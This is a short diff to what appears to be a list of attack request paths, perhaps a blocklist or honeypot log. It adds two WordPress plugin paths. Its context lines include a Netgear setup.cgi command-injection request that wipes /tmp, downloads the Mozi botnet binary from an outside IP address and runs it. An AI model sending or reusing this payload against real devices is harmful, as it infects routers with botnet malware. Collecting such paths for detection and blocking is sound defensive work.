@@ -15475,3 +15475,5 @@ http://apiv4.9hits.com/test
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://219.157.249.194:41286/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /.well-knownold/cookie.php
 /admin/editor3/src/elrte.src.html
+/wp-content/plugins/chaty-pro/readme.txt
+/wp-content/plugins/chaty-pro
